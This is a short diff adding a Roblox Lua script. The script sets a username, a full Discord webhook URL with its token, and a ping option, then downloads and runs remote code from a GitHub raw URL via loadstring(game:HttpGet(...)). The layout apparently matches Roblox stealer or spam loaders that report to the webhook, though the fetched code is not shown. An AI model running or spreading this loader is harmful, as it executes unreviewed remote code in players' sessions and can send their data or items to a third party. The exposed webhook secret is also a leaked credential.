@@ -1,0 +1,5 @@
+UserName = "HerrySzymoN"
+WebHook "https://discord.com/api/webhooks/1062504566723199066/QOzI9arHjglm-Qftlt55wGWwWkA7tWDEj8lkFeCmfybMfzlcJXEm86R0R3OXLJ4x_Gj5"
+Mention = true -- change to false if you don't want to get everyone ping in your webhook.
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LevitationHUB/elspamz/main/rblx", true))()
